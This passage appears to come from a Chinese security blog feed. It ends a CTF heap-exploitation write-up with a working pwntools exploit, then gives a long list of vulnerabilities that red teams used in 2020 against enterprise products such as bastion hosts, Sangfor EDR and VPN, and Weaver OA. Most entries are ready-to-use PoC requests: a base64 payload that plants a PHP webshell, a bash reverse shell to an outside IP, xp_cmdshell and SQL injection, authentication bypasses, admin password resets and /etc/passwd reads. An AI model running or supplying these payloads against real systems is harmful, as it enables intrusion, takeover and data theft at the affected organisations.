class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    sh = process(<span class="string">&#x27;./itemboard&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    offset = <span class="number">0x3c4b20</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">&#x27;pwn2.jarvisoj.com&#x27;</span>, <span class="string">&#x27;9887&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc-2.19.so&#x27;</span>)</span><br><span class="line">    offset = <span class="number">0x3c2760</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./itemboard&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Add</span>(<span class="params">name, <span class="built_in">len</span>, conts</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;choose:\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Item name?\n&#x27;</span>)</span><br><span class="line">    sh.sendline(name)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Description&#x27;s len?\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Description?\n&#x27;</span>)</span><br><span class="line">    sh.sendline(conts)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">List</span>():</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;choose:\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Show</span>(<span class="params">num</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;choose:\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Which item?\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Remove</span>(<span class="params">num</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;choose:\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Which item?\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Libc地址 + system地址</span></span><br><span class="line">Add(<span class="string">&#x27;1&#x27;</span>, <span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">Add(<span class="string">&#x27;2&#x27;</span>, <span class="number">0x80</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">Remove(<span class="number">0</span>)</span><br><span class="line">Show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Description:&#x27;</span>)</span><br><span class="line">leak_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc_addr = leak_addr - <span class="number">88</span> - offset</span><br><span class="line">sys_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># UAF get shell</span></span><br><span class="line">Add(<span class="string">&#x27;cccc&#x27;</span>, <span class="number">32</span>, <span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line">Add(<span class="string">&#x27;dddd&#x27;</span>, <span class="number">32</span>, <span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">Remove(<span class="number">2</span>)</span><br><span class="line">Remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">Add(<span class="string">&#x27;eeee&#x27;</span>, <span class="number">24</span>, <span class="string">&#x27;/bin/sh;&#x27;</span> + <span class="string">&#x27;eeeeeeee&#x27;</span> + p64(sys_addr))</span><br><span class="line">Remove(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/img/ItemBoard/ItemBoard10.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> JarvisOJ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 HW - 漏洞汇总</title>
      <link href="/2020/10/10/HW-Vuln/"/>
      <url>/2020/10/10/HW-Vuln/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>2020年HW期间红队使用的热门漏洞汇总。</p><span id="more"></span><h2 id="Vulnerabilities"><a href="#Vulnerabilities" class="headerlink" title="Vulnerabilities"></a>Vulnerabilities</h2><h3 id="齐治堡垒机前远程命令执行漏洞-CNVD-2019-20835"><a href="#齐治堡垒机前远程命令执行漏洞-CNVD-2019-20835" class="headerlink" title="齐治堡垒机前远程命令执行漏洞 [CNVD-2019-20835]"></a>齐治堡垒机前远程命令执行漏洞 [CNVD-2019-20835]</h3><h4 id="NO-1"><a href="#NO-1" class="headerlink" title="NO.1"></a>NO.1</h4><p>假设10.20.10.10为堡垒机的IP地址。</p><ul><li><p>访问<code>http://10.20.10.11/listener/cluster_manage.php</code>返回”OK”(未授权无需登录)</p></li><li><p>执行<a href="https://10.20.10.10/ha_request.php?action=install&ipaddr=10.20.10.11&node_id=1$%7BIFS%7D%7C%60echo$%7BIFS%7D%22ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK%22%7Cbase64$%7BIFS%7D-d%7Cbash%60%7C$%7BIFS%7D%7Cecho$%7BIFS%7D">https://10.20.10.10/ha_request.php?action&#x3D;install&amp;ipaddr&#x3D;10.20.10.11&amp;node_id&#x3D;1${IFS}|<code>echo$&#123;IFS&#125;&quot;ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK&quot;|base64$&#123;IFS&#125;-d|bash</code>|${IFS}|echo${IFS}</a>链接即可getshell，执行成功后，生成PHP一句话马<code>/var/www/shterm/resources/qrcode/lbj77.php</code>密码<code>10086</code>。</p></li></ul><p><img src="/img/HW-Vuln/HW1.png"></p><ul><li>访问地址为<code>https://10.20.10.10/shterm/resources/qrcode/lbj77.php</code>(密码<code>10086</code>)</li></ul><h4 id="NO-2"><a href="#NO-2" class="headerlink" title="NO.2"></a>NO.2</h4><p>据说还有另外一个版本是java的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /shterm/listener/tui_update.php</span><br><span class="line"></span><br><span class="line">a=[&quot;t&#x27;;import os;os.popen(&#x27;whoami&#x27;)#&quot;]</span><br></pre></td></tr></table></figure><p><img src="/img/HW-Vuln/HW2.png"></p><h3 id="天融信-TopApp-LB-负载均衡系统SQL注入漏洞"><a href="#天融信-TopApp-LB-负载均衡系统SQL注入漏洞" class="headerlink" title="天融信 TopApp-LB 负载均衡系统SQL注入漏洞"></a>天融信 TopApp-LB 负载均衡系统SQL注入漏洞</h3><h4 id="NO-1-1"><a href="#NO-1-1" class="headerlink" title="NO.1"></a>NO.1</h4><p>利用POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /acc/clsf/report/datasource.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Connection: close</span><br><span class="line">Accept: text/javascript, text/html, application/xml, text/xml, */*</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t=l&amp;e=0&amp;s=t&amp;l=1&amp;vid=1+union select 1,2,3,4,5,6,7,8,9,substr(&#x27;a&#x27;,1,1),11,12,13,14,15,16,17,18,19,20,21,22-- +&amp;gid=0&amp;lmt=10&amp;o=r_Speed&amp;asc=false&amp;p=8&amp;lipf=&amp;lipt=&amp;ripf=&amp;ript=&amp;dscp=&amp;proto=&amp;lpf=&amp;lpt=&amp;rpf=&amp;rpt=@。。</span><br></pre></td></tr></table></figure><p><img src="/img/HW-Vuln/HW3.png"></p><h4 id="NO-2-1"><a href="#NO-2-1" class="headerlink" title="NO.2"></a>NO.2</h4><p><a href="https://www.uedbox.com/post/21626/">天融信负载均衡TopApp-LB系统无需密码直接登陆</a></p><p>用户名随意，密码：<code>;id</code></p><h4 id="NO-3"><a href="#NO-3" class="headerlink" title="NO.3"></a>NO.3</h4><p><a href="https://www.uedbox.com/post/22193/">天融信TopApp-LB负载均衡命令执行漏洞</a></p><p>用户名: <code>; ping 9928e5.dnslog.info; echo</code>，密码任意</p><p><img src="/img/HW-Vuln/HW4.png"></p><h3 id="用友-GRP-u8-注入"><a href="#用友-GRP-u8-注入" class="headerlink" title="用友 GRP-u8 注入"></a>用友 GRP-u8 注入</h3><p>利用POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">POST /Proxy HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;)</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: 341</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cVer=9.8.0&amp;dp=&lt;?xml version=&quot;1.0&quot; encoding=&quot;GB2312&quot;?&gt;</span><br><span class="line">    &lt;R9PACKET version=&quot;1&quot;&gt;</span><br><span class="line">        &lt;DATAFORMAT&gt;</span><br><span class="line">            XML</span><br><span class="line">        &lt;/DATAFORMAT&gt; </span><br><span class="line">        &lt;R9FUNCTION&gt;</span><br><span class="line">            &lt;NAME&gt;</span><br><span class="line">                AS_DataRequest</span><br><span class="line">            &lt;/NAME&gt;</span><br><span class="line">            &lt;PARAMS&gt;</span><br><span class="line">                &lt;PARAM&gt;</span><br><span class="line">                &lt;NAME&gt;</span><br><span class="line">                    ProviderName</span><br><span class="line">                &lt;/NAME&gt;</span><br><span class="line">                &lt;DATA format=&quot;text&quot;&gt;</span><br><span class="line">                    DataSetProviderData</span><br><span class="line">                &lt;/DATA&gt;</span><br><span class="line">            &lt;/PARAM&gt;</span><br><span class="line">            &lt;PARAM&gt;</span><br><span class="line">            &lt;NAME&gt;</span><br><span class="line">                Data</span><br><span class="line">            &lt;/NAME&gt;</span><br><span class="line">            &lt;DATA format=&quot;text&quot;&gt;</span><br><span class="line">                exec xp_cmdshell &#x27;whoami&#x27;</span><br><span class="line">            &lt;/DATA&gt;</span><br><span class="line">            &lt;/PARAM&gt;</span><br><span class="line">            &lt;/PARAMS&gt;</span><br><span class="line">        &lt;/R9FUNCTION&gt;</span><br><span class="line">    &lt;/R9PACKET&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/HW-Vuln/HW5.png"></p><h3 id="绿盟-UTS-综合威胁探针管理员任意登录"><a href="#绿盟-UTS-综合威胁探针管理员任意登录" class="headerlink" title="绿盟 UTS 综合威胁探针管理员任意登录"></a>绿盟 UTS 综合威胁探针管理员任意登录</h3><p>逻辑漏洞，利用方式参考：<a href="https://www.hackbug.net/archives/112.html">https://www.hackbug.net/archives/112.html</a></p><ul><li><p>1、修改登录数据包 {“status”:false,”mag”:””} -&gt; {“status”:true,”mag”:””}</p></li><li><p>2、<code>/webapi/v1/system/accountmanage/account</code>接口逻辑错误泄漏了管理员的账户信息包括密码（md5）</p></li><li><p>3、再次登录，替换密码上个数据包中md5密码</p></li><li><p>4、登录成功</p></li></ul><h4 id="实际案例"><a href="#实际案例" class="headerlink" title="实际案例"></a>实际案例</h4><p><img src="/img/HW-Vuln/HW6.png"></p><p>对响应包进行修改，将false更改为true的时候可以泄露管理用户的md5值密码：</p><p><img src="/img/HW-Vuln/HW7.png"></p><p><img src="/img/HW-Vuln/HW8.png"></p><p>利用取得的md5值去登录页面：</p><p><img src="/img/HW-Vuln/HW9.png"></p><p><img src="/img/HW-Vuln/HW10.png"></p><h3 id="天融信数据防泄漏系统越权修改管理员密码"><a href="#天融信数据防泄漏系统越权修改管理员密码" class="headerlink" title="天融信数据防泄漏系统越权修改管理员密码"></a>天融信数据防泄漏系统越权修改管理员密码</h3><p>无需登录权限，由于修改密码处未校验原密码，且<code>/?module=auth_user&amp;action=mod_edit_pwd</code>，接口未授权访问，造成直接修改任意用户密码，默认superman账户uid为1。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /?module=auth_user&amp;action=mod_edit_pwd</span><br><span class="line">Cookie: username=superman;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uid=1&amp;pd=Newpasswd&amp;mod_pwd=1&amp;dlp_perm=1</span><br></pre></td></tr></table></figure><h3 id="WPS-Office-图片解析错误导致堆损坏RCE"><a href="#WPS-Office-图片解析错误导致堆损坏RCE" class="headerlink" title="WPS Office 图片解析错误导致堆损坏RCE"></a>WPS Office 图片解析错误导致堆损坏RCE</h3><p>fofa指纹：<code>title=&quot;SANGFOR终端检测响应平台&quot;</code>。</p><p>漏洞利用：<code>https://ip/ui/login.php?user=需登录的用户名</code>。例如<code>https://1.1.1.1:1980/ui/login.php?user=admin</code>，查询完毕以后即可登录平台。</p><h3 id="深信服-EDR-漏洞"><a href="#深信服-EDR-漏洞" class="headerlink" title="深信服 EDR 漏洞"></a>深信服 EDR 漏洞</h3><p>漏洞利用方法：<code>https://xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&amp;host=whoami</code>。</p><p><img src="/img/HW-Vuln/HW11.png"></p><p>网上已经放出批量利用方法了，如<a href="https://github.com/A2gel/sangfor-edr-exploit">https://github.com/A2gel/sangfor-edr-exploit</a>。</p><h3 id="sangfor-EDR-RCE漏洞"><a href="#sangfor-EDR-RCE漏洞" class="headerlink" title="sangfor EDR RCE漏洞"></a>sangfor EDR RCE漏洞</h3><p>利用POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">post /api/edr/sanforinter/v2/cssp/slog_client?token=ssskbkds HTTP/1.1</span><br><span class="line"></span><br><span class="line">&#123;&quot;params&quot;:&quot;w=123\&quot;&#x27;1234123&#x27;\&quot;|bash -i &gt;/dev/tcp/167.179.118.219/8899 0&gt;&amp;1&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/HW-Vuln/HW12.png"></p><p><img src="/img/HW-Vuln/HW13.png"></p><h3 id="联软科技产品存在任意文件上传和命令执行漏洞"><a href="#联软科技产品存在任意文件上传和命令执行漏洞" class="headerlink" title="联软科技产品存在任意文件上传和命令执行漏洞"></a>联软科技产品存在任意文件上传和命令执行漏洞</h3><p>任意文件上传漏洞，存在于用户自检报告上传时，后台使用黑名单机制对上传的文件进行过滤和限制，由于当前黑名单机制存在缺陷，文件过滤机制可以被绕过，导致存在文件上传漏洞；利用该漏洞可以获取webshell权限。</p><p>命令执行漏洞，存在于后台资源读取过程中，对于自动提交的用户可控参数没有进行安全检查，可以通过构造特殊参数的数据包，后台在执行过程中直接执行了提交数据包中的命令参数，导致命令执行漏洞；该漏洞能够以当前运行的中间件用户权限执行系统命令，根据中间件用户权限不同，可以进行添加系统账户，使用反弹shell等操作。</p><h3 id="泛微OA-Bsh-远程代码执行漏洞"><a href="#泛微OA-Bsh-远程代码执行漏洞" class="headerlink" title="泛微OA Bsh 远程代码执行漏洞"></a>泛微OA Bsh 远程代码执行漏洞</h3><p>2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁，泛微e-cology OA系统的Java Beanshell接口可被未授权访问，攻击者调用该Beanshell接口，可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行，漏洞等级严重。</p><p>利用POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /weaver/bsh.servlet.BshServlet HTTP/1.1</span><br><span class="line">Host: xxxxxxxx:8088</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 98</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bsh.script=eval%00(&quot;ex&quot;%2b&quot;ec(\&quot;whoami\&quot;)&quot;);&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw</span><br></pre></td></tr></table></figure><p><code>eval%00(&quot;ex&quot;%2b&quot;ec(\&quot;whoami\&quot;)&quot;);</code>也可以换成<code>ex\u0065c(&quot;cmd /c dir&quot;);</code>。 </p><p><a href="https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204">CNVD-2019-32204利用脚本</a>。</p><h3 id="泛微OA-e-cology-SQL注入漏洞"><a href="#泛微OA-e-cology-SQL注入漏洞" class="headerlink" title="泛微OA e-cology SQL注入漏洞"></a>泛微OA e-cology SQL注入漏洞</h3><p><a href="https://xz.aliyun.com/t/6531">泛微OA WorkflowCenterTreeData接口注入漏洞(限oracle数据库)</a>。</p><p>漏洞利用：修改NULL后为要查询的字段名，修改from后为查询的表。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&amp;scope=2333 HTTP/1.1</span><br><span class="line">Host: ip:port</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 2236</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0 d%0a%0d%0a%0</span><br></pre></td></tr></table></figure><p><img src="/img/HW-Vuln/HW14.png"></p><h3 id="深信服-VPN-远程代码执行"><a href="#深信服-VPN-远程代码执行" class="headerlink" title="深信服 VPN 远程代码执行"></a>深信服 VPN 远程代码执行</h3><p>深信服vpnweb登录逆向学习：<code>https://www.cnblogs.com/potatsoSec/p/12326356.html</code></p><p>漏洞利用：<code>wget -t %d -T %d --spider %s</code></p><h3 id="深信服-VPN-口令爆破"><a href="#深信服-VPN-口令爆破" class="headerlink" title="深信服 VPN 口令爆破"></a>深信服 VPN 口令爆破</h3><p><a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&tid=20633">关于SSL VPN认证时的验证码绕过</a>。</p><h3 id="常见边界产品-防火墙-网关-路由器-VPN-弱口令漏洞"><a href="#常见边界产品-防火墙-网关-路由器-VPN-弱口令漏洞" class="headerlink" title="常见边界产品(防火墙, 网关, 路由器, VPN) 弱口令漏洞"></a>常见边界产品(防火墙, 网关, 路由器, VPN) 弱口令漏洞</h3><p>各厂商防火墙登录IP、初始密码、技术支持：<code>https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA</code>。</p><h3 id="Thinkphp-相关漏洞"><a href="#Thinkphp-相关漏洞" class="headerlink" title="Thinkphp 相关漏洞"></a>Thinkphp 相关漏洞</h3><p>Thinkphp是国内很常见的PHP框架，存在远程代码执行&#x2F;sql注入&#x2F;反序列化&#x2F;日志文件泄露等问题。</p><ul><li><p><a href="http://zone.secevery.com/article/1165">ThinkPHP漏洞总结</a></p></li><li><p><a href="https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/">挖掘暗藏ThinkPHP中的反序列利用链</a></p></li><li><p><a href="https://blog.csdn.net/Fly_hps/article/details/81201904">ThinkPHP使用不当可能造成敏感信息泄露</a></p></li><li><p><a href="https://www.anquanke.com/post/id/203461">DSMall代码审计</a></p></li></ul><p>漏洞利用：</p><ul><li><p><a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">thinkphp v5.x 远程代码执行漏洞-POC集合</a></p></li><li><p><a href="https://github.com/Dido1960/thinkphp">thinkphp反序列化漏洞复现及POC编写</a></p></li><li><p><a href="https://github.com/whirlwind110/tphack">Thinkphp3&#x2F;5 Log文件泄漏利用工具</a></p></li></ul><h3 id="Spring-系列漏洞"><a href="#Spring-系列漏洞" class="headerlink" title="Spring 系列漏洞"></a>Spring 系列漏洞</h3><p>Spring是java web里最最最最常见的组件了，自然也是研究的热门，好用的漏洞主要是Spring Boot Actuators反序列化。</p><ul><li><p><a href="https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/">Spring 框架漏洞集合</a></p></li><li><p><a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators">Exploiting Spring Boot Actuators | Veracode blog</a></p></li><li><p><a href="https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Spring Boot Actuators配置不当导致RCE漏洞复现</a></p></li></ul><p>漏洞利用：</p><ul><li><p><a href="https://github.com/mpgn/Spring-Boot-Actuator-Exploit">Spring Boot Actuator (jolokia) XXE&#x2F;RCE</a></p></li><li><p><a href="https://github.com/artsploit/yaml-payload">A tiny project for generating SnakeYAML deserialization payloads</a></p></li></ul><h3 id="Solr-系列漏洞"><a href="#Solr-系列漏洞" class="headerlink" title="Solr 系列漏洞"></a>Solr 系列漏洞</h3><p>Solr是企业常见的全文搜索服务，这两年也爆出很多安全漏洞。</p><ul><li><p><a href="https://www.freebuf.com/vuls/218730.html">Apache Solr最新RCE漏洞分析</a></p></li><li><p><a href="https://paper.seebug.org/1009/">Apache Solr DataImportHandler远程代码执行漏洞(CVE-2019-0193)分析</a></p></li></ul><p>漏洞利用：</p><ul><li><p><a href="https://github.com/veracode-research/solr-injection">Apache Solr Injection Research</a></p></li><li><p><a href="https://github.com/jas502n/CVE-2019-12409">Apache Solr RCE (ENABLE_REMOTE_JMX_OPTS&#x3D;”true”)</a></p></li><li><p><a href="https://github.com/mogwailabs/mjet">MOGWAI LABS JMX exploitation toolkit</a></p></li></ul><h3 id="Ghostscript-上传图片代码执行"><a href="#Ghostscript-上传图片代码执行" class="headerlink" title="Ghostscript 上传图片代码执行"></a>Ghostscript 上传图片代码执行</h3><p>Ghostscript是图像处理中十分常用的库，集成在imagemagick等多个开源组件中，其<code>.ps</code>文件存在沙箱绕过导致代码执行的问题影响广泛，由于上传图片就有可能代码执行，很多大厂中招。</p><p><a href="https://www.anquanke.com/post/id/157513">ghostscript命令执行漏洞预警</a>。</p><p>漏洞利用：</p><ul><li><p><a href="https://www.exploit-db.com/search?q=Ghostscript">Exploit Database Search</a></p></li><li><p><a href="https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116">CVE-2019-6116</a></p></li></ul><p>如果发现网站可以上传图片，且图片没有经过裁剪，最后返回缩略图，这里就可能存在Ghostscript上传图片代码执行dnslog可以用ping <code>uname</code>.admin.ceye.io或ping <code>whoami</code>.admin.ceye.io保存成图片，以后用起来方便，有个版本的centos和ubuntu poc还不一样，可以这样构造ping <code>whoami</code>.centos.admin.ceye.io &#x2F; ping <code>whoami</code>.ubuntu.admin.ceye.io分别命名为centos_ps.jpg&#x2F;ubuntu_ps.jpg，这样测试的时候直接传2个文件，通过DNSLOG可以区分是哪个poc执行的。</p><h3 id="泛微云桥任意文件读取漏洞"><a href="#泛微云桥任意文件读取漏洞" class="headerlink" title="泛微云桥任意文件读取漏洞"></a>泛微云桥任意文件读取漏洞</h3><ul><li><p><code>http://www.xxx.com/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt</code></p></li><li><p><code>http://www.xxx.com/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///c://windows/win.ini&amp;fileExt=txt</code></p></li></ul><h3 id="网瑞达-WebVPN-RCE-漏洞"><a href="#网瑞达-WebVPN-RCE-漏洞" class="headerlink" title="网瑞达 WebVPN RCE 漏洞"></a>网瑞达 WebVPN RCE 漏洞</h3><p>WebVPN是提供基于web的内网应用访问控制，允许授权用户访问只对内网开放的web应用，实现类似VPN（虚拟专用网）的功能。</p><h3 id="Apache-DolphinScheduler-高危漏洞-CVE-2020-11974、CVE-2020-13922"><a href="#Apache-DolphinScheduler-高危漏洞-CVE-2020-11974、CVE-2020-13922" class="headerlink" title="Apache DolphinScheduler 高危漏洞 [CVE-2020-11974、CVE-2020-13922]"></a>Apache DolphinScheduler 高危漏洞 [CVE-2020-11974、CVE-2020-13922]</h3><p>CVE-2020-11974与mysql connectorj远程执行代码漏洞有关，在选择mysql作为数据库时，攻击者可通过<code>jdbc connect</code>参数输入<code>&#123;“detectCustomCollations”:true，“ autoDeserialize”:true&#125;</code>在 DolphinScheduler 服务器上远程执行代码。</p><p>CVE-2020-13922导致普通用户可通过api interface在DolphinScheduler 系统中覆盖其他用户的密码：<code>api interface /dolphinscheduler/users/update</code>。</p><p>受影响版本：Apache DolphinScheduler &#x3D; 1.2.0、1.2.1、1.3.1</p><p>利用POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /dolphinscheduler/users/update</span><br><span class="line"></span><br><span class="line">id=1&amp;userName=admin&amp;userPassword=Password1!&amp;tenantId=1&amp;email=sdluser%40sdluser.sdluser&amp;phone=</span><br></pre></td></tr></table></figure><p><img 